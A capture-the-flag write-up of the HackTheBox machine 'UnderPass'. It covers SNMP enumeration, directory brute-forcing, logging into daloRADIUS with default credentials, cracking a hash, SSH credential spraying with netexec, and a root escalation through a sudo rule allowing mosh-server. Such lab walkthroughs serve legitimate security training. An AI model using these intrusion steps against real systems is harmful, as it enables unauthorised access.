---
title: HTB: UnderPass
url: https://0xdf.gitlab.io/2025/05/10/htb-underpass.html
date: 2025-05-10T13:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: htb-underpass, ctf, hackthebox, nmap, snmp, snmp-walk, daloradius, feroxbuster, default-creds, netexec, mosh
---

![UnderPass](/img/underpass-cover.png)

I’ll pull data from SNMP to find a daloRADIUS server on UnderPass. I’ll find the login page, and use default creds to get access. There I’ll find a hash for a user, which can be cracked to get SSH access to the box. That use can run a Mobile Shell (Mosh) server as root using sudo, and that leads to a root shell.

## Box Info

| Name | [UnderPass](https://hackthebox.com/machines/underpass)  [UnderPass](https://hackthebox.com/machines/underpass) [Play on HackTheBox](https://hackthebox.com/machines/underpass) |
| --- | --- |
| Release Date | [21 Dec 2024](https://twitter.com/hackthebox_eu/status/1869789811428430260) |
| Retire Date | 10 May 2025 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for UnderPass |
| Radar Graph | Radar chart for UnderPass |
| First Blood User | 00:30:02[bryanmcnulty bryanmcnulty](https://app.hackthebox.com/users/905477) |
| First Blood Root | 00:41:15[ff5 ff5](https://app.hackthebox.com/users/390025) |
| Creator | [dakkmaddy dakkmaddy](https://app.hackthebox.com/users/17571) |

## Recon

### Initial Scanning

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.48
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-04 09:35 UTC
Nmap scan report for 10.10.11.48
Host is up (0.095s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.87 seconds
oxdf@hacky$ nmap -p 22,80 -vv -sCV 10.10.11.48
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-04 09:35 UTC
...[snip]...
Nmap scan report for 10.10.11.48
Host is up, received reset ttl 63 (0.092s latency).
Scanned at 2025-05-04 09:35:49 UTC for 19s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK+kvbyNUglQLkP2Bp7QVhfp7EnRWMHVtM7xtxk34WU5s+lYksJ07/lmMpJN/bwey1SVpG0FAgL0C/+2r71XUEo=
|   256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ8XNCLFSIxMNibmm+q7mFtNDYzoGAJ/vDNa6MUjfU91
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
...[snip]...
Nmap done: 1 IP address (1 host up) scanned in 19.73 seconds

```

Based on the [OpenSSH and Apache versions](/cheatsheets/os#ubuntu) versions, the host is likely running Ubuntu 22.04 jammy (or perhaps 22.10 kinetic).

It appears like the webpage is just the default Ubuntu Apache page.

A UDP scan shows that SNMP is open as well:

```

oxdf@hacky$ nmap -sU --min-rate 10000 10.10.11.48
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-04 09:46 UTC
Nmap scan report for 10.10.11.48
Host is up (0.094s latency).
Not shown: 993 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
161/udp   open   snmp
17573/udp closed unknown
20752/udp closed unknown
24594/udp closed unknown
25157/udp closed unknown
32818/udp closed unknown
33281/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 0.59 seconds
oxdf@hacky$ nmap -sU -sCV -p 161 10.10.11.48
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-04 09:48 UTC
Nmap scan report for 10.10.11.48
Host is up (0.092s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-sysdescr: Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
|_  System uptime: 15h01m34.90s (5409490 timeticks)
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: c7ad5c4856d1cf6600000000
|   snmpEngineBoots: 31
|_  snmpEngineTime: 15h01m35s
Service Info: Host: UnDerPass.htb is the only daloradius server in the basin!

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.76 seconds

```

It reveals a hostname, `UnDerPass.htb`, as well as a mention of “daloradius”. I’ll rescan TCP 80 with `nmap` using the domain name, but it returns the same.

### SNMP - UDP 161

#### Installation

`snmpwalk` will dump the full SNMP information. To get it setup, I’ll need to `sudo apt install snmp`, and then optionally `sudo apt install snmp-mibs-downloader` and then comment out the line it says to comment out in `/etc/snmp/snmp.conf`. The optional step will make the output more useful.

#### Execute

Now I’ll run `snmpwalk`, trying the common default community string (the password for SNMP) “public”:

```

oxdf@hacky$ snmpwalk -v 2c -c public 10.10.11.48 | tee snmp_data
SNMPv2-MIB::sysDescr.0 = STRING: Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (8753027) 1 day, 0:18:50.27
SNMPv2-MIB::sysContact.0 = STRING: steve@underpass.htb
SNMPv2-MIB::sysName.0 = STRING: UnDerPass.htb is the only daloradius server in the basin!
SNMPv2-MIB::sysLocation.0 = STRING: Nevada, U.S.A. but not Vegas
SNMPv2-MIB::sysServices.0 = INTEGER: 72
SNMPv2-MIB::sysORLastChange.0 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORID.1 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
SNMPv2-MIB::sysORID.2 = OID: SNMP-MPD-MIB::snmpMPDCompliance
SNMPv2-MIB::sysORID.3 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
SNMPv2-MIB::sysORID.4 = OID: SNMPv2-MIB::snmpMIB
SNMPv2-MIB::sysORID.5 = OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup
SNMPv2-MIB::sysORID.6 = OID: TCP-MIB::tcpMIB
SNMPv2-MIB::sysORID.7 = OID: UDP-MIB::udpMIB
SNMPv2-MIB::sysORID.8 = OID: IP-MIB::ip
SNMPv2-MIB::sysORID.9 = OID: SNMP-NOTIFICATION-MIB::snmpNotifyFullCompliance
SNMPv2-MIB::sysORID.10 = OID: NOTIFICATION-LOG-MIB::notificationLogMIB
SNMPv2-MIB::sysORDescr.1 = STRING: The SNMP Management Architecture MIB.
SNMPv2-MIB::sysORDescr.2 = STRING: The MIB for Message Processing and Dispatching.
SNMPv2-MIB::sysORDescr.3 = STRING: The management information definitions for the SNMP User-based Security Model.
SNMPv2-MIB::sysORDescr.4 = STRING: The MIB module for SNMPv2 entities
SNMPv2-MIB::sysORDescr.5 = STRING: View-based Access Control Model for SNMP.
SNMPv2-MIB::sysORDescr.6 = STRING: The MIB module for managing TCP implementations
SNMPv2-MIB::sysORDescr.7 = STRING: The MIB module for managing UDP implementations
SNMPv2-MIB::sysORDescr.8 = STRING: The MIB module for managing IP and ICMP implementations
SNMPv2-MIB::sysORDescr.9 = STRING: The MIB modules for managing SNMP Notification, plus filtering.
SNMPv2-MIB::sysORDescr.10 = STRING: The MIB module for logging SNMP Notifications.
SNMPv2-MIB::sysORUpTime.1 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.2 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.3 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.4 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.5 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.6 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.7 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.8 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.9 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.10 = Timeticks: (1) 0:00:00.01
HOST-RESOURCES-MIB::hrSystemUptime.0 = Timeticks: (8754464) 1 day, 0:19:04.64
HOST-RESOURCES-MIB::hrSystemDate.0 = STRING: 2025-5-4,11:5:54.0,+0:0
HOST-RESOURCES-MIB::hrSystemInitialLoadDevice.0 = INTEGER: 393216
HOST-RESOURCES-MIB::hrSystemInitialLoadParameters.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-126-generic root=/dev/mapper/ubuntu--vg-ubuntu -lv ro net.ifnames=0 biosdevname=0"
HOST-RESOURCES-MIB::hrSystemNumUsers.0 = Gauge32: 0
HOST-RESOURCES-MIB::hrSystemProcesses.0 = Gauge32: 219
HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = INTEGER: 0
HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = No more variables left in this MIB View (It is past the end of the MIB tree)

```

In addition to the description `nmap` printed, there’s an email address, `steve@underpass.htb`. That’s about it.

### Website - TCP 80

#### Site

The website is still just the default Apache page:

![image-20250504071918284](/img/image-20250504071918284.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

#### Tech Stack

The HTTP response headers don’t show anything else:

```

HTTP/1.1 200 OK
Date: Sun, 04 May 2025 11:21:14 GMT
Server: Apache/2.4.52 (Ubuntu)
Last-Modified: Thu, 29 Aug 2024 01:28:15 GMT
ETag: "29af-620c8638b9276-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 10671
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html

```

The 404 page is the [default Apache 404](/cheatsheets/404#apache--httpd):

![image-20250504072013438](/img/image-20250504072013438.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and it finds nothing:

```

oxdf@hacky$ feroxbuster -u http://underpass.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://underpass.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       22l      105w     5952c http://underpass.htb/icons/ubuntu-logo.png
200      GET      363l      961w    10671c http://underpass.htb/
[####################] - 67s    30005/30005   0s      found:2       errors:37     
[####################] - 66s    30000/30000   454/s   http://underpass.htb/ 

```

### dalorRADIUS

#### Background

There is a reference in the SNMP data about Underpass being a “daloradius” server. [daloRADIUS](https://www.daloradius.com/) is a UI management tool for Radius that boasts:

> No more mysql database console.
> No more editing freeradius configuration files.
>
> with daloRADIUS you can easily and quickly manage your FreeRADIUS deployment, thanks to flexible user interface and navigation flow.

Remote Authentication Dial-In User Service, or [RADIUS](https://en.wikipedia.org/wiki/RADIUS), is:

> a networking protocol that provides centralized authentication, authorization, and accounting ([AAA](https://en.wikipedia.org/wiki/AAA_(computer_security))) management for users who connect and use a network service.

#### Find Base Path

Without much else to go on, I’ll try visiting `/daloradius`, and there is a different response:

![image-20250504083938684](/img/image-20250504083938684.png)

403 Forbidden is not the same as 404 Not Found. This is likely a directory in the web root folder on the server.

#### Brute Force

`daloradius` isn’t in the word list used above, so it wasn’t identified by `feroxbuster`. I’ll try another run on this directory. It finds a ton:

```

oxdf@hacky$ feroxbuster -u http://underpass.htb/daloradius

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://underpass.htb/daloradius
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      319c http://underpass.htb/daloradius => http://underpass.htb/daloradius/
301      GET        9l       28w      327c http://underpass.htb/daloradius/library => http://underpass.htb/daloradius/library/
301      GET        9l       28w      323c http://underpass.htb/daloradius/doc => http://underpass.htb/daloradius/doc/
301      GET        9l       28w      327c http://underpass.htb/daloradius/contrib => http://underpass.htb/daloradius/contrib/
301      GET        9l       28w      325c http://underpass.htb/daloradius/setup => http://underpass.htb/daloradius/setup/
301      GET        9l       28w      323c http://underpass.htb/daloradius/app => http://underpass.htb/daloradius/app/
301      GET        9l       28w      329c http://underpass.htb/daloradius/app/users => http://underpass.htb/daloradius/app/users/
301      GET        9l       28w      330c http://underpass.htb/daloradius/app/common => http://underpass.htb/daloradius/app/common/
301      GET        9l       28w      335c http://underpass.htb/daloradius/contrib/scripts => http://underpass.htb/daloradius/contrib/scripts/
301      GET        9l       28w      330c http://underpass.htb/daloradius/contrib/db => http://underpass.htb/daloradius/contrib/db/
301      GET        9l       28w      338c http://underpass.htb/daloradius/app/common/library => http://underpass.htb/daloradius/app/common/library/
301      GET        9l       28w      337c http://underpass.htb/daloradius/app/users/library => http://underpass.htb/daloradius/app/users/library/
301      GET        9l       28w      339c http://underpass.htb/daloradius/app/common/includes => http://underpass.htb/daloradius/app/common/includes/
200      GET      340l     2968w    18011c http://underpass.htb/daloradius/LICENSE
301      GET        9l       28w      337c http://underpass.htb/daloradius/app/common/static => http://underpass.htb/daloradius/app/common/static/
301      GET        9l       28w      340c http://underpass.htb/daloradius/app/common/templates => http://underpass.htb/daloradius/app/common/templates/
301      GET        9l       28w      336c http://underpass.htb/daloradius/app/users/static => http://underpass.htb/daloradius/app/users/static/
301      GET        9l       28w      334c http://underpass.htb/daloradius/app/users/lang => http://underpass.htb/daloradius/app/users/lang/
301      GET        9l       28w      339c http://underpass.htb/daloradius/app/users/static/js => http://underpass.htb/daloradius/app/users/static/js/
301      GET        9l       28w      341c http://underpass.htb/daloradius/app/common/static/css => http://underpass.htb/daloradius/app/common/static/css/
301      GET        9l       28w      343c http://underpass.htb/daloradius/app/users/static/images => http://underpass.htb/daloradius/app/users/static/images/
301      GET        9l       28w      347c http://underpass.htb/daloradius/contrib/scripts/maintenance => http://underpass.htb/daloradius/contrib/scripts/maintenance/
301      GET        9l       28w      348c http://underpass.htb/daloradius/app/users/library/javascript => http://underpass.htb/daloradius/app/users/library/javascript/
301      GET        9l       28w      348c http://underpass.htb/daloradius/app/common/library/phpmailer => http://underpass.htb/daloradius/app/common/library/phpmailer/
301      GET        9l       28w      343c http://underpass.htb/daloradius/app/users/notifications => http://underpass.htb/daloradius/app/users/notifications/
301      GET        9l       28w      344c http://underpass.htb/daloradius/app/users/library/tables => http://underpass.htb/daloradius/app/users/library/tables/
301      GET        9l       28w      346c http://underpass.htb/daloradius/app/common/library/jpgraph => http://underpass.htb/daloradius/app/common/library/jpgraph/
301      GET        9l       28w      355c http://underpass.htb/daloradius/contrib/scripts/maintenance/monitor => http://underpass.htb/daloradius/contrib/scripts/maintenance/monitor/
301      GET        9l       28w      345c http://underpass.htb/daloradius/app/common/library/dompdf => http://underpass.htb/daloradius/app/common/library/dompdf/
301      GET        9l       28w      350c http://underpass.htb/daloradius/app/users/notifications/dompdf => http://underpass.htb/daloradius/app/users/notifications/dompdf/
301      GET        9l       28w      333c http://underpass.htb/daloradius/app/operators => http://underpass.htb/daloradius/app/operators/
301      GET        9l       28w      340c http://underpass.htb/daloradius/app/operators/static => http://underpass.htb/daloradius/app/operators/static/
301      GET        9l       28w      347c http://underpass.htb/daloradius/app/operators/static/images => http://underpass.htb/daloradius/app/operators/static/images/
301      GET        9l       28w      343c http://underpass.htb/daloradius/app/operators/static/js => http://underpass.htb/daloradius/app/operators/static/js/
301      GET        9l       28w      338c http://underpass.htb/daloradius/app/operators/lang => http://underpass.htb/daloradius/app/operators/lang/
301      GET        9l       28w      341c http://underpass.htb/daloradius/app/operators/library => http://underpass.htb/daloradius/app/operators/library/
301      GET        9l       28w      346c http://underpass.htb/daloradius/app/operators/library/ajax => http://underpass.htb/daloradius/app/operators/library/ajax/
301      GET        9l       28w      344c http://underpass.htb/daloradius/app/operators/static/css => http://underpass.htb/daloradius/app/operators/static/css/
301      GET        9l       28w      352c http://underpass.htb/daloradius/app/operators/library/extensions => http://underpass.htb/daloradius/app/operators/library/extensions/
301      GET        9l       28w      347c http://underpass.htb/daloradius/app/operators/notifications => http://underpass.htb/daloradius/app/operators/notifications/
301      GET        9l       28w      348c http://underpass.htb/daloradius/app/operators/library/graphs => http://underpass.htb/daloradius/app/operators/library/graphs/
301      GET        9l       28w      337c http://underpass.htb/daloradius/contrib/heartbeat => http://underpass.htb/daloradius/contrib/heartbeat/
[####################] - 8m    750155/750155  0s      found:42      errors:99811
[####################] - 6m     30000/30000   78/s    http://underpass.htb/daloradius/
[####################] - 6m     30000/30000   81/s    http://underpass.htb/daloradius/app/
[####################] - 6m     30000/30000   81/s    http://underpass.htb/daloradius/library/
[####################] - 7m     30000/30000   76/s    http://underpass.htb/daloradius/doc/
[####################] - 6m     30000/30000   77/s    http://underpass.htb/daloradius/contrib/
[####################] - 6m     30000/30000   84/s    http://underpass.htb/daloradius/setup/
[####################] - 6m     30000/30000   79/s    http://underpass.htb/daloradius/app/common/
[####################] - 6m     30000/30000   78/s    http://underpass.htb/daloradius/app/users/
[####################] - 6m     30000/30000   78/s    http://underpass.htb/daloradius/contrib/scripts/
[####################] - 6m     30000/30000   79/s    http://underpass.htb/daloradius/contrib/db/
[####################] - 6m     30000/30000   80/s    http://underpass.htb/daloradius/app/common/includes/
[####################] - 6m     30000/30000   79/s    http://underpass.htb/daloradius/app/common/static/
[####################] - 6m     30000/30000   80/s    http://underpass.htb/daloradius/app/common/library/
[####################] - 6m     30000/30000   79/s    http://underpass.htb/daloradius/app/common/templates/
[####################] - 6m     30000/30000   80/s    http://underpass.htb/daloradius/app/users/static/
[####################] - 6m     30000/30000   80/s    http://underpass.htb/daloradius/app/users/lang/
[####################] - 6m     30000/30000   82/s    http://underpass.htb/daloradius/app/users/library/
[####################] - 6m     30000/30000   80/s    http://underpass.htb/daloradius/contrib/scripts/maintenance/
[####################] - 6m     30000/30000   81/s    http://underpass.htb/daloradius/app/users/notifications/
[####################] - 5m     30000/30000   97/s    http://underpass.htb/daloradius/app/operators/
[####################] - 5m     30000/30000   97/s    http://underpass.htb/daloradius/app/operators/static/
[####################] - 5m     30000/30000   98/s    http://underpass.htb/daloradius/app/operators/lang/
[####################] - 5m     30000/30000   100/s   http://underpass.htb/daloradius/app/operators/library/
[####################] - 5m     30000/30000   107/s   http://underpass.htb/daloradius/app/operators/notifications/
[####################] - 3m     30000/30000   190/s   http://underpass.htb/daloradius/contrib/heartbeat/ 

```

These match up nicely with what is on the [daloradius GitHub](https://github.com/lirantal/daloradius):

![image-20250504085348096](/img/image-20250504085348096.png)

#### Identify Login Pages

I’ll search the Git repo for “login”, and the second result is in the file `app/users/login.php`:

![image-20250504085517305](/img/image-20250504085517305.png)

Visiting `/daloradius/app/users/login.php` does return a login page:

![image-20250504085539041](/img/image-20250504085539041.png)

There’s another one at `/daloradius/app/operators/login.php`:

![image-20250504085928532](/img/image-20250504085928532.png)

These are different logins, for different levels of user. The second one notes the version running, 2.2 beta.

## Shell as svcMosh

### Enumerate daloRADIUS

#### daloRADIUS Access

A quick search shows many references to a default login of administrator with the password “radius”:

![image-20250504090447553](/img/image-20250504090447553.png)

These don’t work on the user login, but do on the operator login:

![image-20250504090533188](/img/image-20250504090533188.png)

#### Users

There’s a dashboard for users that shows one user:

![image-20250504090642670](/img/image-20250504090642670.png)

The username is svcMosh, and there’s a 32 hex character password that is likely a hash. I’ll throw that into [crackstation](https://crackstation.net/) and it returns “underwaterfriends”:

![image-20250504090757973](/img/image-20250504090757973.png)

### SSH

#### Find Username / Password

I’ve got a likely password and a couple potential usernames. I’ll make a couple lists:

```

oxdf@hacky$ cat users.txt 
steve
svcmosh
root
oxdf@hacky$ cat passwords.txt 
underwaterfriends
412DD4759978ACFCC81DEAB01B382403

```

I’ll have `netexec` try each combination:

```

oxdf@hacky$ netexec ssh underpass.htb -u users.txt -p passwords.txt --continue-on-success
SSH         10.10.11.48     22     underpass.htb    [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10
SSH         10.10.11.48     22     underpass.htb    [-] steve:underwaterfriends
SSH         10.10.11.48     22     underpass.htb    [+] svcMosh:underwaterfriends  Linux - Shell access!
SSH         10.10.11.48     22     underpass.htb    [-] root:underwaterfriends
SSH         10.10.11.48     22     underpass.htb    [-] steve:412DD4759978ACFCC81DEAB01B382403
SSH         10.10.11.48     22     underpass.htb    [-] root:412DD4759978ACFCC81DEAB01B382403

```

It is worth noting that username case matters here! svcmosh would not have succeeded.

#### Shell

I’ll connect over SSH:

```

oxdf@hacky$ sshpass -p underwaterfriends ssh svcMosh@underpass.htb
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)
...[snip]...
Last login: Sat Jan 11 13:29:47 2025 from 10.10.14.62
svcMosh@underpass:~$ 

```
*Disclaimer - I like to use `sshpass` to pass passwords via the command line for CTF blog posts because it makes it very clear what I’m doing. Never enter real credentials into the command line like this.*

And grab `user.txt`:

```

svcMosh@underpass:~$ cat user.txt 
a4569c2d52f1b97ec0109c747ea727f3e07ecdcf

```

## Shell as root

### Enumeration

svcMosh’s home directory is pretty empty:

```

svcMosh@underpass:~$ find . -type f -ls
    24713      4 -rw-r--r--   1 svcMosh  svcMosh      3771 Sep  7  2024 ./.bashrc
    24714      4 -rw-r--r--   1 svcMosh  svcMosh       807 Sep  7  2024 ./.profile
    24726      0 -rw-r--r--   1 svcMosh  svcMosh         0 Sep  8  2024 ./.cache/motd.legal-displayed
    24719      4 -rw-r-----   1 root     svcMosh        41 Dec 10 14:41 ./user.txt
    24715      4 -rw-r--r--   1 svcMosh  svcMosh       220 Sep  7  2024 ./.bash_logout
    24722      4 -rw-r--r--   1 svcMosh  svcMosh       571 Sep  8  2024 ./.ssh/id_rsa.pub
    24723      4 -rw-rw-r--   1 svcMosh  svcMosh       571 Sep  8  2024 ./.ssh/authorized_keys
    24721      4 -rw-------   1 svcMosh  svcMosh      2602 Sep  8  2024 ./.ssh/id_rsa

```

There is an SSH key I can grab, but as I already have a password that doesn’t add much.

There are not other users with home directories in `/home`:

```

svcMosh@underpass:/home$ ls
svcMosh

```

Or users with shells configured:

```

svcMosh@underpass:/$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
svcMosh:x:1002:1002:svcMosh,60001,8675309,8675309:/home/svcMosh:/bin/bash

```

svcMosh can run `mosh-server` as any user using `sudo`:

```

svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server

```

### Mosh

[Mosh](https://mosh.org/) (short for mobile shell) is a:

> Remote terminal application that allows **roaming**, supports **intermittent connectivity**, and provides intelligent **local echo** and line editing of user keystrokes.
>
> Mosh is a replacement for interactive SSH terminals. It’s more robust and responsive, especially over Wi-Fi, cellular, and long-distance links.
>
> Mosh is free software, available for GNU/Linux, BSD, macOS, Solaris, Android, Chrome, and iOS.

When I run `mosh-server`, it starts a server in the background:

```

svcMosh@underpass:~$ sudo mosh-server 

MOSH CONNECT 60001 DTokqgn0cTYP6mTpvcQjSw

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

[mosh-server detached, pid = 5862]

```

It gives the port (60001) and a key. If I start another one, it get a new port and key:

```

svcMosh@underpass:~$ sudo mosh-server 

MOSH CONNECT 60002 RHJidhpW6K8OfJwrV1g85w
...[snip]...
[mosh-server detached, pid = 5868]
svcMosh@underpass:~$ sudo mosh-server 

MOSH CONNECT 60003 U6iB0axJSSq3TYVg3ZFbVA
...[snip]...
[mosh-server detached, pid = 5874]

```

If I try to connect to the server using `mosh-client`, it will complain there’s no `MOSH_KEY` environment variable:

```

svcMosh@underpass:~$ mosh-client 127.0.0.1 60001
MOSH_KEY environment variable not found.

```

It is worth nothing that these server sessions seem to be cleared fairly frequently, so if I want too long, I’ll have to start the server again. I’ll run again, this time setting the environment variable to the key from the server at the start of the command, and it gives a shell:

```

svcMosh@underpass:/home$ MOSH_KEY=DTokqgn0cTYP6mTpvcQjSw mosh-client 127.0.0.1 60001
...[snip]...
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64) 
...[snip]...
root@underpass:~#

```

And I can grab `root.txt`:

```

root@underpass:~# cat root.txt
03148d5f************************

```